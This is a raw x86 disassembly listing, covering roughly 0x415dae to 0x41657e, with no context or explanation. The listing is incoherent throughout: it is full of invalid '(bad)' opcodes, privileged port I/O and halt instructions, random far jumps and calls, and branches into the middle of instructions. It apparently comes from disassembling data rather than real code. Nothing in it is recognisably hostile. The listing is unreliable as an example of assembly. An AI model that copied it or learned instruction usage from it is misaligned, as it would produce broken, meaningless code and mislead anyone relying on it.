  415dae:	jbe    0x415d9d
  415db0:	push   0x46
  415db2:	xchg   al,dh
  415db4:	push   edx
  415db5:	and    BYTE PTR [esi+0x3088e805],0xa1
  415dbc:	mov    edx,0xcaa2d190
  415dc1:	adc    BYTE PTR [edi+eax*8],ch
  415dc4:	push   ebp
  415dc5:	mov    edx,0x2b0b3789
  415dca:	xchg   ebx,eax
  415dcb:	dec    esi
  415dcc:	xchg   esp,eax
  415dcd:	xchg   esi,eax
  415dce:	loopne 0x415e02
  415dd0:	mov    ch,bh
  415dd2:	dec    ebx
  415dd3:	sub    BYTE PTR [eax+0x30f1e0ec],bh
  415dd9:	fiadd  WORD PTR [eax-0x7f]
  415ddc:	sub    eax,0x4b55108f
  415de1:	ja     0x415e29
  415de3:	inc    edx
  415de4:	fisub  WORD PTR [ecx+eax*1+0x6acf4047]
  415deb:	es dec edi
  415ded:	hlt    
  415dee:	daa    
  415def:	sbb    DWORD PTR [eax-0xd],edx
  415df2:	push   ebp
  415df3:	nop
  415df4:	mov    edx,ss
  415df6:	xchg   ebx,eax
  415df7:	xchg   ebx,eax
  415df8:	xchg   ebx,eax
  415df9:	push   eax
  415dfa:	icebp  
  415dfb:	mov    ebx,0x6359b419
  415e00:	call   FWORD PTR [ecx+0x65f580a9]
  415e06:	xor    edi,eax
  415e08:	test   al,0x9
  415e0a:	adc    ecx,esi
  415e0c:	fild   QWORD PTR [esi]
  415e0e:	sub    ah,BYTE PTR [esi+0x48]
  415e11:	mov    cl,0x3e
  415e13:	xor    DWORD PTR [esi-0x7d8869e4],edi
  415e19:	xchg   ebx,eax
  415e1a:	mov    cl,0x30
  415e1c:	push   0xaf7dfa37
  415e21:	popa   
  415e22:	call   0x72c0:0x509472f6
  415e29:	iret   
  415e2a:	scas   al,BYTE PTR es:[edi]
  415e2b:	cdq    
  415e2c:	xchg   edi,eax
  415e2d:	leave  
  415e2e:	sti    
  415e2f:	sub    eax,0x8bcbcbd4
  415e34:	out    dx,al
  415e35:	xchg   ecx,eax
  415e36:	pop    ecx
  415e37:	rcl    BYTE PTR [ecx-0x2],1
  415e3a:	repz push 0xffffffa9
  415e3d:	xor    eax,DWORD PTR [ebp-0x53]
  415e40:	out    dx,eax
  415e41:	imul   edx,DWORD PTR [ebx-0x1a],0xffffffc1
  415e45:	sar    BYTE PTR [edi+0x42f6470a],1
  415e4b:	push   ds
  415e4c:	adc    eax,0x33624c38
  415e51:	aaa    
  415e52:	(bad)  
  415e53:	scas   eax,DWORD PTR es:[edi]
  415e54:	es xchg esp,eax
  415e56:	test   al,0xd8
  415e58:	pop    edi
  415e59:	mov    ebp,0x611fac7b
  415e5e:	data16 mov dh,0x5d
  415e61:	(bad)  
  415e62:	mov    esi,0x15c2aa0e
  415e67:	stos   DWORD PTR es:[edi],eax
  415e68:	daa    
  415e69:	adc    al,ch
  415e6b:	and    bl,al
  415e6d:	jb     0x415e85
  415e6f:	ror    BYTE PTR [esi],1
  415e71:	mov    dh,0x67
  415e73:	mov    dh,0x8b
  415e75:	add    bl,dh
  415e77:	sbb    cl,BYTE PTR ds:0xe2616c1
  415e7d:	into   
  415e7e:	fs mov esi,0xefb6fdfc
  415e84:	ins    DWORD PTR es:[edi],dx
  415e85:	cs xchg esi,eax
  415e87:	pop    ss
  415e88:	in     al,dx
  415e89:	xor    ebx,DWORD PTR [esi-0x5a718359]
  415e8f:	fmul   QWORD PTR [ecx]
  415e91:	scas   al,BYTE PTR es:[edi]
  415e92:	outs   dx,BYTE PTR ds:[esi]
  415e93:	loop   0x415f11
  415e95:	out    0xb5,al
  415e97:	nop
  415e98:	inc    ebx
  415e99:	sub    al,0x54
  415e9b:	out    0xdc,eax
  415e9d:	cli    
  415e9e:	cld    
  415e9f:	pop    esp
  415ea0:	dec    edi
  415ea1:	bound  ebp,QWORD PTR [edx+0x2d]
  415ea4:	push   0x18
  415ea6:	jl     0x415e5d
  415ea8:	mov    bh,ch
  415eaa:	hlt    
  415eab:	ficom  DWORD PTR fs:[esi]
  415eae:	and    esi,ebx
  415eb0:	push   edi
  415eb1:	mov    bh,0xf5
  415eb3:	das    
  415eb4:	mov    ch,0x89
  415eb6:	(bad)  
  415eb7:	jmp    0x415e4f
  415eb9:	adc    dl,BYTE PTR [edx-0x5c5b586c]
  415ebf:	cmc    
  415ec0:	fsubr  st(3),st
  415ec2:	mov    bl,0xd6
  415ec4:	jmp    0x5c1e:0xf19c7709
  415ecb:	call   DWORD PTR [edi-0x3c]
  415ece:	es add eax,0x64f1158c
  415ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ed5:	jno    0x415f18
  415ed7:	xlat   BYTE PTR ds:[ebx]
  415ed8:	cmp    BYTE PTR [ecx+0x4a1d7c13],dl
  415ede:	or     dh,bl
  415ee0:	lea    eax,[ecx-0x3]
  415ee3:	aaa    
  415ee4:	dec    eax
  415ee5:	mov    cs,WORD PTR [esi-0x66741703]
  415eeb:	imul   esp,DWORD PTR [edi],0x3d
  415eee:	push   ebp
  415eef:	sbb    eax,0xc2c69b7d
  415ef4:	mov    DWORD PTR [edi+0x7f724364],edx
  415efa:	in     al,dx
  415efb:	je     0x415f0e
  415efd:	out    dx,al
  415efe:	sub    eax,0x2d541dc2
  415f03:	xlat   BYTE PTR ds:[ebx]
  415f04:	add    ecx,DWORD PTR ds:0xcd805f50
  415f0a:	or     edx,esp
  415f0c:	xor    eax,0x5997bfc7
  415f11:	rcr    BYTE PTR [edi],1
  415f13:	into   
  415f14:	or     BYTE PTR [esi],dh
  415f16:	das    
  415f17:	adc    DWORD PTR [edi*4+0x6d6c2c58],ebp
  415f1e:	mov    WORD PTR [esi+edx*4-0x1b],?
  415f22:	mov    cx,WORD PTR [ecx+0x41023ea7]
  415f29:	cmp    al,0x86
  415f2b:	out    dx,eax
  415f2c:	push   ebx
  415f2d:	push   cs
  415f2e:	aas    
  415f2f:	cwde   
  415f30:	aad    0xe7
  415f32:	lds    esi,FWORD PTR [esi-0x73]
  415f35:	jmp    0x321e:0x17ac8ada
  415f3c:	pop    esi
  415f3d:	add    DWORD PTR [esi-0x69],ecx
  415f40:	inc    esi
  415f41:	dec    edi
  415f42:	mov    bl,BYTE PTR [ecx]
  415f44:	and    eax,0xc950436d
  415f49:	pop    ecx
  415f4a:	jg     0x415ed2
  415f4c:	lods   eax,DWORD PTR ds:[esi]
  415f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f4e:	fdiv   QWORD PTR [edi+0x598a7884]
  415f54:	fs push eax
  415f56:	in     eax,dx
  415f57:	xor    ah,BYTE PTR [eax+edi*2+0x427e5f5]
  415f5e:	shl    BYTE PTR [edx+ecx*8+0x21],cl
  415f62:	test   eax,0x3fcc219e
  415f67:	ins    BYTE PTR es:[edi],dx
  415f68:	stos   DWORD PTR es:[edi],eax
  415f69:	fisttp WORD PTR ss:[eax-0xb5f64ef]
  415f70:	xchg   BYTE PTR [ebp+0x6e],bh
  415f73:	adc    esi,DWORD PTR [eax-0x66]
  415f76:	ja     0x415f9d
  415f78:	out    dx,al
  415f79:	xchg   esp,eax
  415f7a:	je     0x415fba
  415f7c:	sbb    BYTE PTR [esi+0xc],bh
  415f7f:	jae    0x415fc5
  415f81:	pop    es
  415f82:	mov    ?,WORD PTR [edx+ebp*8-0x45]
  415f86:	in     eax,0xdf
  415f88:	cwde   
  415f89:	in     eax,0xe
  415f8b:	rol    DWORD PTR [ebx+0x4a],0xa9
  415f8f:	mov    esp,DWORD PTR [ebx+ebx*4]
  415f92:	inc    ebp
  415f93:	sbb    DWORD PTR [edx+0x39],esi
  415f96:	jnp    0x415f93
  415f98:	(bad)  
  415f99:	mov    eax,DWORD PTR [eax+0x10e9c030]
  415f9f:	lock xchg edi,eax
  415fa1:	ret    
  415fa2:	cld    
  415fa3:	push   cs
  415fa4:	push   ds
  415fa5:	(bad)  
  415fa6:	in     al,dx
  415fa7:	xchg   edx,eax
  415fa8:	add    dl,bl
  415faa:	sbb    DWORD PTR [edi+0x29],ebx
  415fad:	jp     0x415f52
  415faf:	adc    BYTE PTR [esi+0x4],ch
  415fb2:	lock jle 0x415ff8
  415fb5:	in     eax,dx
  415fb6:	inc    esp
  415fb7:	adc    DWORD PTR [esp+esi*1+0x12453f41],esi
  415fbe:	div    DWORD PTR ds:[edx+0x3b]
  415fc2:	pop    esi
  415fc3:	sub    DWORD PTR [ebx+0x12c447d8],esp
  415fc9:	jne    0x415ff3
  415fcb:	jg     0x415fde
  415fcd:	mov    es,WORD PTR [ecx]
  415fcf:	in     eax,0x3e
  415fd1:	pusha  
  415fd2:	daa    
  415fd3:	xor    esp,eax
  415fd5:	mov    esp,0xba36c164
  415fda:	icebp  
  415fdb:	mov    dh,0x5c
  415fdd:	nop
  415fde:	jmp    0x41603a
  415fe0:	inc    ecx
  415fe1:	rol    DWORD PTR [edi-0x4ea5351],1
  415fe7:	(bad)  
  415fe8:	into   
  415fe9:	inc    edx
  415fea:	mov    eax,ds:0xb4803fe8
  415fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ff0:	adc    edi,ebx
  415ff2:	sbb    edx,DWORD PTR [edi+0x6a]
  415ff5:	mov    eax,ss
  415ff7:	test   DWORD PTR [ecx+eiz*1],edi
  415ffa:	mov    dh,0x75
  415ffc:	mov    edi,0xa139e440
  416001:	and    eax,0x58ddeebd
  416006:	mov    ebp,0x1f0fd646
  41600b:	pop    es
  41600c:	mov    al,0x9f
  41600e:	pop    esp
  41600f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416010:	jo     0x415fab
  416012:	mov    bl,0x8d
  416014:	test   eax,0x410dd965
  416019:	sbb    eax,DWORD PTR [edi+0x1c9ebedd]
  41601f:	pop    esp
  416020:	jmp    0x416024
  416022:	pop    edx
  416023:	cli    
  416024:	mov    esp,0x30758802
  416029:	push   esp
  41602a:	inc    edi
  41602b:	xchg   esp,eax
  41602c:	or     ebp,ebx
  41602e:	xchg   esp,eax
  41602f:	dec    edi
  416030:	push   ecx
  416031:	mov    dl,0x9d
  416033:	daa    
  416034:	mov    BYTE PTR [esi],ch
  416036:	stos   BYTE PTR es:[edi],al
  416037:	imul   DWORD PTR [edx+0x3d]
  41603a:	pop    ebp
  41603b:	mov    dl,0xa5
  41603d:	mov    ecx,0xa912c2a7
  416042:	inc    eax
  416043:	adc    BYTE PTR [ebx-0x71d44203],0x12
  41604a:	sbb    ebx,eax
  41604c:	pop    edi
  41604d:	cli    
  41604e:	test   eax,0x7b7fadcc
  416053:	add    BYTE PTR [edx+0x27],ah
  416056:	into   
  416057:	scas   al,BYTE PTR es:[edi]
  416058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416059:	out    dx,eax
  41605a:	xchg   edi,eax
  41605b:	or     eax,0xdddadb
  416060:	add    DWORD PTR [esi-0x398a7bc2],esi
  416066:	(bad)  
  416067:	push   eax
  416068:	imul   ecx,DWORD PTR ss:[eax],0xe4a9e545
  41606f:	mov    ds:0x3375ecbf,eax
  416074:	mov    al,ds:0x83e4f912
  416079:	jl     0x416007
  41607b:	leave  
  41607c:	sub    eax,0x85db5697
  416081:	test   BYTE PTR [edi-0x70d48932],0x5
  416088:	aaa    
  416089:	cld    
  41608a:	adc    eax,0x9aed1186
  41608f:	mov    ebp,0xf1dea7f8
  416094:	add    eax,0xb56a8ef0
  416099:	jmp    DWORD PTR [ebx-0xf03450c]
  41609f:	mov    dl,0xa7
  4160a1:	or     esi,ebx
  4160a3:	repz xor BYTE PTR [edx+0x21a2b268],al
  4160aa:	fst    QWORD PTR [ebx-0x8040249]
  4160b0:	mov    dh,0xf6
  4160b2:	test   BYTE PTR [ecx-0x68dd9d1f],0x16
  4160b9:	jns    0x416085
  4160bb:	pop    ss
  4160bc:	lds    eax,FWORD PTR [edi-0x395cb346]
  4160c2:	sub    BYTE PTR [ebp+edx*8-0x7e],bl
  4160c6:	dec    esp
  4160c7:	sub    DWORD PTR [ebx],0x2e87a3cf
  4160cd:	pushf  
  4160ce:	ret    0x236c
  4160d1:	and    ch,BYTE PTR [ebx+0x5a4a63b8]
  4160d7:	retf   
  4160d8:	add    BYTE PTR [ebx-0x28641182],0x79
  4160df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160e0:	call   0x52aa5d18
  4160e5:	mov    edx,DWORD PTR [esi+0x89bb497]
  4160eb:	mov    bl,0x23
  4160ed:	inc    esp
  4160ee:	dec    eax
  4160ef:	pop    esp
  4160f0:	adc    BYTE PTR [ebx+0x3f],ch
  4160f3:	aam    0xed
  4160f5:	les    esp,FWORD PTR [ebp-0x40772dc]
  4160fb:	mov    edi,0x63f98d07
  416100:	test   eax,0xcaf08ba5
  416105:	inc    edx
  416106:	adc    esi,ecx
  416108:	loopne 0x4160d9
  41610a:	mul    ecx
  41610c:	xchg   esi,eax
  41610d:	xchg   esp,eax
  41610e:	div    esp
  416110:	sub    bh,BYTE PTR [ecx+0x4ff0afc1]
  416116:	mov    ds:0xff332e7f,eax
  41611b:	int    0xd5
  41611d:	pop    edx
  41611e:	add    esi,0xffffffe5
  416121:	inc    ebx
  416122:	imul   ebp,DWORD PTR [edi+0x71],0x7c
  416126:	jge    0x41611d
  416128:	lods   eax,DWORD PTR ds:[esi]
  416129:	jno    0x416131
  41612b:	aas    
  41612c:	mov    eax,0x3a21d776
  416131:	inc    esp
  416132:	adc    DWORD PTR [edx-0x1],esp
  416135:	adc    al,0xc1
  416137:	and    ebx,edi
  416139:	sbb    eax,0x5e764f22
  41613e:	mov    dh,0xfc
  416140:	xlat   BYTE PTR ds:[ebx]
  416141:	fst    DWORD PTR [esi+eiz*1-0x4bd64849]
  416148:	mov    bh,0xe2
  41614a:	mov    bh,0x22
  41614c:	jne    0x4160f1
  41614e:	or     ebp,edi
  416150:	lea    eax,[edi-0x1ed289fc]
  416156:	jle    0x4161a7
  416158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416159:	lods   eax,DWORD PTR ds:[esi]
  41615a:	push   esi
  41615b:	adc    eax,0x15ea9f4d
  416160:	int3   
  416161:	sahf   
  416162:	mov    cl,0x30
  416164:	ss scas al,BYTE PTR es:[edi]
  416166:	loopne 0x41612e
  416168:	jns    0x416124
  41616a:	dec    ecx
  41616b:	shl    BYTE PTR [esi+0x3812ebdd],cl
  416171:	ret    0xd588
  416174:	lods   al,BYTE PTR ds:[esi]
  416175:	ss repnz clc 
  416178:	inc    esp
  416179:	nop
  41617a:	repz dec ebp
  41617c:	mov    ecx,0xd43ec504
  416181:	fnstsw WORD PTR [edi]
  416183:	imul   ecx,DWORD PTR [esi+0x2f],0x375f6853
  41618a:	inc    edi
  41618b:	inc    ebx
  41618c:	xor    ch,BYTE PTR [ebp-0x22f2fc4a]
  416192:	ror    DWORD PTR [ecx],1
  416194:	or     ah,BYTE PTR [ebp-0x57]
  416197:	iret   
  416198:	push   eax
  416199:	out    dx,al
  41619a:	in     al,0x2
  41619c:	ror    DWORD PTR [ebx],0xe5
  41619f:	cmp    ch,BYTE PTR [eax-0x7687d21f]
  4161a5:	push   cs
  4161a6:	push   edx
  4161a7:	xor    al,0xbf
  4161a9:	pop    ds
  4161aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161ab:	data16 ja 0x416155
  4161ae:	daa    
  4161af:	xor    BYTE PTR [edx],dl
  4161b1:	mov    eax,ds:0x97686abd
  4161b6:	pop    es
  4161b7:	(bad)  
  4161b8:	stc    
  4161b9:	dec    esi
  4161ba:	push   eax
  4161bb:	xchg   ecx,eax
  4161bc:	lods   eax,DWORD PTR ds:[esi]
  4161bd:	jmp    0xe18c8964
  4161c2:	sub    bl,bl
  4161c4:	in     al,dx
  4161c5:	jbe    0x416190
  4161c7:	enter  0xb350,0xdc
  4161cb:	nop
  4161cc:	std    
  4161cd:	and    al,0xeb
  4161cf:	cdq    
  4161d0:	pop    ss
  4161d1:	jl     0x4161b3
  4161d3:	retf   
  4161d4:	xchg   edx,eax
  4161d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161d6:	jae    0x4161c2
  4161d8:	xchg   esp,eax
  4161d9:	cld    
  4161da:	cs aas 
  4161dc:	sub    al,0xcf
  4161de:	xor    ebx,DWORD PTR [ecx-0x4bdb4e1f]
  4161e4:	inc    esp
  4161e5:	and    eax,0x895b1dcb
  4161ea:	xchg   ecx,eax
  4161eb:	fstp   DWORD PTR [edx]
  4161ed:	mov    ah,0x0
  4161ef:	xlat   BYTE PTR ds:[ebx]
  4161f0:	add    ebx,DWORD PTR [edi-0x7e]
  4161f3:	push   cs
  4161f4:	jg     0x416247
  4161f6:	data16 xlat BYTE PTR ds:[ebx]
  4161f8:	add    edi,DWORD PTR [ecx+0x64]
  4161fb:	lock sar DWORD PTR [ebx+ebp*1+0x597c99d6],1
  416203:	hlt    
  416204:	mov    bl,BYTE PTR [edx-0x79]
  416207:	cmp    eax,0xabd3ba98
  41620c:	mov    dl,dh
  41620e:	lods   al,BYTE PTR ds:[esi]
  41620f:	ret    0x4de9
  416212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416213:	fnsave [ebx-0x3395a406]
  416219:	cs imul eax,ebp,0x5674b937
  416220:	in     eax,0xbb
  416222:	popa   
  416223:	jp     0x4161fa
  416225:	fmul   DWORD PTR [edx]
  416227:	loopne 0x4161d1
  416229:	sub    eax,DWORD PTR [ecx+0x563bdf3]
  41622f:	(bad)  
  416230:	cmp    ebx,DWORD PTR [edx-0x480ad894]
  416236:	je     0x416270
  416238:	sub    dh,BYTE PTR [edx-0xd]
  41623b:	or     al,0xf2
  41623d:	out    0xb,al
  41623f:	pusha  
  416240:	and    ecx,ebx
  416242:	repnz out dx,eax
  416244:	jle    0x4162b7
  416246:	mov    ds:0x177f81f4,eax
  41624b:	icebp  
  41624c:	mov    eax,ds:0xceff2afb
  416251:	pusha  
  416252:	(bad)  
  416253:	ret    0x9cb
  416256:	bound  edi,QWORD PTR [edi]
  416258:	xchg   ebp,eax
  416259:	div    DWORD PTR [edx]
  41625b:	fucomp st(6)
  41625d:	repz fs out dx,eax
  416260:	xchg   esp,eax
  416261:	add    BYTE PTR [edi-0x7b9f0373],bh
  416267:	jl     0x416248
  416269:	adc    eax,DWORD PTR [edx-0x3d950d49]
  41626f:	lods   al,BYTE PTR ds:[esi]
  416270:	sbb    bh,bh
  416272:	cmp    al,0xfa
  416274:	ret    
  416275:	cmp    DWORD PTR [ecx-0x83cc481],ebp
  41627b:	push   ebx
  41627c:	dec    edx
  41627d:	into   
  41627e:	dec    esi
  41627f:	inc    eax
  416280:	and    DWORD PTR [ebx-0x101468be],esp
  416286:	jmp    0xc19:0xdcc42679
  41628d:	daa    
  41628e:	xor    al,0xab
  416290:	mov    eax,ds:0xaa84e957
  416295:	xchg   DWORD PTR [eax-0xa73bf86],edi
  41629b:	into   
  41629c:	repnz inc ebx
  41629e:	popf   
  41629f:	sub    eax,0x934b3f67
  4162a4:	or     dh,BYTE PTR [esi-0x5e5f3a34]
  4162aa:	cmp    ebp,DWORD PTR [ebp-0x6c9a854b]
  4162b0:	sbb    DWORD PTR [esi+0x622dc5a5],0xf
  4162b7:	mov    edi,0x5c41aaeb
  4162bc:	mov    ecx,0x6907d4b1
  4162c1:	stos   BYTE PTR es:[edi],al
  4162c2:	mov    edi,0x9d781db5
  4162c7:	mov    ch,ch
  4162c9:	sub    edx,eax
  4162cb:	mov    dh,0x37
  4162cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162ce:	sbb    ebp,esi
  4162d0:	xlat   BYTE PTR ds:[ebx]
  4162d1:	int3   
  4162d2:	js     0x416346
  4162d4:	sub    esi,DWORD PTR [esi]
  4162d6:	mov    al,0x5
  4162d8:	dec    esp
  4162d9:	loope  0x4162eb
  4162db:	adc    DWORD PTR [eax],ebx
  4162dd:	ror    esp,cl
  4162df:	sub    dl,cl
  4162e1:	call   0x6243b94d
  4162e6:	(bad)  
  4162e7:	arpl   WORD PTR [edi],dx
  4162e9:	jecxz  0x416322
  4162eb:	cmc    
  4162ec:	xchg   esp,eax
  4162ed:	sbb    ah,BYTE PTR [esi+0x5a]
  4162f0:	mov    ecx,esi
  4162f2:	pop    esi
  4162f3:	sub    al,0xfa
  4162f5:	pusha  
  4162f6:	mov    esi,0xdcc8f073
  4162fb:	hlt    
  4162fc:	jmp    0x4162c7
  4162fe:	xor    al,0x21
  416300:	jnp    0x416326
  416302:	and    DWORD PTR [ecx+0x4c8d72b],ebx
  416308:	inc    edi
  416309:	les    ecx,FWORD PTR [ecx]
  41630b:	push   0xffffffb4
  41630d:	mov    esp,0x66307c36
  416312:	aaa    
  416313:	push   es
  416314:	dec    eax
  416315:	adc    al,0x53
  416317:	mov    cl,0x4e
  416319:	sbb    bh,dh
  41631b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41631c:	jno    0x416394
  41631e:	test   DWORD PTR [edi+0x60],esp
  416321:	mov    edi,0x4df6c86c
  416326:	fnstsw WORD PTR [esi]
  416328:	imul   ebx,DWORD PTR [esi-0x7703d28f],0xffffff9b
  41632f:	int    0x75
  416331:	adc    edi,DWORD PTR [esi-0x2a]
  416334:	pusha  
  416335:	int3   
  416336:	test   BYTE PTR [ebp+0x4b],0x1e
  41633a:	mov    ch,0x23
  41633c:	xchg   esp,eax
  41633d:	retf   
  41633e:	mov    ds:0x73e2c5ce,al
  416343:	hlt    
  416344:	mov    dl,0xe1
  416346:	sbb    eax,DWORD PTR [esi-0x27]
  416349:	fldenv [esi+0x5f740d0d]
  41634f:	aad    0xfe
  416351:	ret    0xaddd
  416354:	sbb    edi,DWORD PTR [edi]
  416356:	jge    0x4162e4
  416358:	jno    0x416382
  41635a:	cwde   
  41635b:	sbb    BYTE PTR ds:0x2bcd3a2b,0xac
  416362:	cmp    DWORD PTR [ecx],esi
  416364:	jecxz  0x416318
  416366:	cwde   
  416367:	xchg   esi,eax
  416368:	push   ds
  416369:	ret    
  41636a:	add    DWORD PTR [esi],ebx
  41636c:	addr16 cwde 
  41636e:	jecxz  0x416308
  416370:	xor    bl,cl
  416372:	xor    al,0xce
  416374:	sub    eax,0xb6cec236
  416379:	pop    ds
  41637a:	sub    al,0xc4
  41637c:	test   al,0x10
  41637e:	dec    esp
  416380:	popf   
  416381:	xor    DWORD PTR [ebx],0xffffffb1
  416384:	call   0xdb1fd76b
  416389:	lds    ebp,FWORD PTR [ecx+eax*1-0x73]
  41638d:	cmc    
  41638e:	cmp    esp,esi
  416390:	ret    
  416391:	and    eax,0xf58320df
  416396:	sbb    DWORD PTR [edi+0x53],esi
  416399:	lahf   
  41639a:	pop    esi
  41639b:	xchg   esi,eax
  41639c:	push   ecx
  41639d:	mov    dh,0x99
  41639f:	mov    eax,0xd462f6b1
  4163a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163a5:	or     al,0x25
  4163a7:	pop    ecx
  4163a8:	mov    ecx,0x8d7830f5
  4163ad:	cs cli 
  4163af:	and    BYTE PTR [bx+di],dl
  4163b2:	adc    ebx,DWORD PTR [ecx+0x74f7bd97]
  4163b8:	popf   
  4163b9:	sbb    eax,0x7aff8f2e
  4163be:	sub    eax,0xec810be3
  4163c3:	and    DWORD PTR [ebx],eax
  4163c5:	test   BYTE PTR ds:0x68e2bbc4,bl
  4163cb:	jg     0x416379
  4163cd:	mov    ds:0xf2989d76,eax
  4163d2:	call   0x8eb9:0x3634a7db
  4163d9:	nop
  4163da:	lahf   
  4163db:	and    dl,bl
  4163dd:	push   esi
  4163de:	test   ch,dh
  4163e0:	scas   eax,DWORD PTR es:[edi]
  4163e1:	int3   
  4163e2:	xchg   esp,eax
  4163e3:	mov    eax,0x84b92bee
  4163e9:	inc    eax
  4163ea:	cmc    
  4163eb:	rcl    BYTE PTR [edx+0x7a],cl
  4163ee:	pop    esp
  4163ef:	dec    ebp
  4163f0:	cmp    eax,0xc1845198
  4163f5:	pop    es
  4163f6:	loopne 0x4163cb
  4163f8:	push   edx
  4163f9:	push   edx
  4163fa:	push   ebx
  4163fb:	out    dx,al
  4163fc:	adc    eax,0x2441169e
  416401:	pop    edi
  416402:	cs imul edi,edi,0x54923427
  416409:	add    ebx,ebx
  41640b:	es cmp ecx,edx
  41640e:	pop    ecx
  41640f:	aas    
  416410:	stos   DWORD PTR es:[edi],eax
  416411:	neg    BYTE PTR [ebx+eax*2]
  416414:	or     al,0xc7
  416416:	push   ebp
  416417:	push   es
  416418:	push   ecx
  416419:	aaa    
  41641a:	cld    
  41641b:	fdiv   DWORD PTR [ebx+0x46e365fb]
  416421:	cmp    al,0x90
  416423:	jl     0x416436
  416425:	mov    edi,0xa7189a17
  41642a:	sbb    eax,0x4d87efae
  41642f:	mov    esp,0xe8859dc2
  416434:	xchg   esi,eax
  416435:	mov    esi,DWORD PTR [edx+0x1b34e623]
  41643b:	jo     0x416422
  41643d:	add    edi,edx
  41643f:	pop    ss
  416440:	fdivrp st(7),st
  416442:	outs   dx,BYTE PTR ds:[esi]
  416443:	push   0xfffffff9
  416445:	rcr    DWORD PTR [ebx],1
  416447:	inc    ebp
  416448:	in     eax,dx
  416449:	inc    eax
  41644b:	dec    edi
  41644c:	lahf   
  41644d:	pop    edi
  41644e:	sbb    eax,DWORD PTR [esi-0x501ee53d]
  416454:	leave  
  416455:	xor    edi,DWORD PTR [ebx+0x7c9cc279]
  41645b:	sub    eax,0x546285ba
  416460:	push   ss
  416461:	es cmp eax,0xf2f19449
  416467:	aaa    
  416468:	mov    WORD PTR [edx+edi*1+0x57],ss
  41646c:	stos   BYTE PTR es:[edi],al
  41646d:	dec    ebp
  41646e:	pop    esi
  41646f:	sub    eax,0x18f0fbd1
  416474:	sbb    eax,0xdfedbd0c
  416479:	mov    ds:0xbacf7a41,eax
  41647e:	dec    ebx
  41647f:	bound  edx,QWORD PTR [ecx]
  416481:	ret    0xf1ab
  416484:	mov    edx,0x9b24844b
  416489:	in     eax,0x29
  41648b:	jle    0x41640d
  41648d:	hlt    
  41648e:	rol    DWORD PTR [ebp+0x72],cl
  416491:	repnz ins DWORD PTR es:[edi],dx
  416493:	mov    ds:0xc831923a,al
  416498:	adc    al,0x9
  41649a:	das    
  41649b:	test   eax,0x262a69f8
  4164a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164a2:	iret   
  4164a3:	js     0x416496
  4164a5:	es xchg esi,eax
  4164a7:	xchg   ebx,eax
  4164a8:	dec    ecx
  4164a9:	dec    eax
  4164aa:	pop    edi
  4164ab:	and    al,0x63
  4164ad:	sbb    BYTE PTR [ebx-0x399d0215],dh
  4164b3:	adc    ebx,ebx
  4164b5:	sub    esp,DWORD PTR [eax+0x48ab7a3f]
  4164bb:	cdq    
  4164bc:	pop    esi
  4164bd:	pop    ebx
  4164be:	and    eax,0x2f2634a9
  4164c3:	mov    BYTE PTR [edx+0x51c68887],dl
  4164c9:	ret    0x48fb
  4164cc:	adc    DWORD PTR [ebx+0x67],eax
  4164cf:	je     0x416452
  4164d1:	nop
  4164d2:	add    DWORD PTR [edi+0x18],ebp
  4164d5:	es (bad) 
  4164d7:	jecxz  0x4164d8
  4164d9:	push   0xb955586
  4164de:	or     DWORD PTR [esi-0x4048857c],0xffffffcf
  4164e5:	jecxz  0x416487
  4164e7:	stos   DWORD PTR es:[edi],eax
  4164e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164e9:	(bad)  
  4164ea:	dec    esi
  4164eb:	sbb    al,0xb0
  4164ed:	(bad)  
  4164ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164ef:	mov    bl,0x7a
  4164f1:	lods   eax,DWORD PTR ds:[esi]
  4164f2:	outs   dx,DWORD PTR ds:[esi]
  4164f3:	jmp    0xe512:0x38b433ac
  4164fa:	pop    ss
  4164fb:	jmp    0x947a:0xcb576aaf
  416502:	iret   
  416503:	(bad)  
  416505:	jae    0x4164c0
  416507:	je     0x41656c
  416509:	int    0x3f
  41650b:	dec    ebp
  41650c:	aas    
  41650d:	lea    eax,[ebx+0x6f9585e3]
  416513:	dec    ecx
  416514:	icebp  
  416515:	shr    BYTE PTR [edi+edx*4],1
  416518:	xor    al,0xfb
  41651a:	mov    DWORD PTR [edi-0x27],ebp
  41651d:	xchg   esi,eax
  41651e:	rcr    BYTE PTR [edx-0x64a57a40],1
  416524:	pop    edi
  416525:	nop
  416526:	test   DWORD PTR [ebx+ecx*1],ecx
  416529:	fadd   DWORD PTR [edi-0x7a]
  41652c:	sub    ebx,edx
  41652e:	dec    esi
  41652f:	or     ch,BYTE PTR [edi+esi*2-0x2d]
  416533:	dec    edi
  416534:	mov    eax,cs
  416536:	jle    0x4164d8
  416538:	jae    0x4164d4
  41653a:	or     dl,BYTE PTR [ebx]
  41653c:	jno    0x416564
  41653e:	or     BYTE PTR [edx+0x67],0x1b
  416542:	add    al,0xa4
  416544:	dec    edi
  416545:	shl    DWORD PTR [eax-0x15],0xb5
  416549:	test   al,0x69
  41654b:	fimul  WORD PTR [eax-0x13aff16b]
  416551:	push   esi
  416552:	mov    eax,0x666afe9f
  416557:	ss mov dh,0x6b
  41655a:	lock call DWORD PTR [ebp-0x29]
  41655e:	test   eax,0xf8e7f990
  416563:	out    dx,eax
  416564:	xor    edx,DWORD PTR [edi]
  416566:	mov    cl,0x1b
  416568:	fistp  WORD PTR [ebp+0x44]
  41656b:	call   0x3c19ba32
  416570:	mov    ebp,0x331e0b2c
  416575:	sub    BYTE PTR [esi],0x76
  416578:	adc    bh,BYTE PTR [esi+0x2db88bea]
  41657e:	jne    0x416560
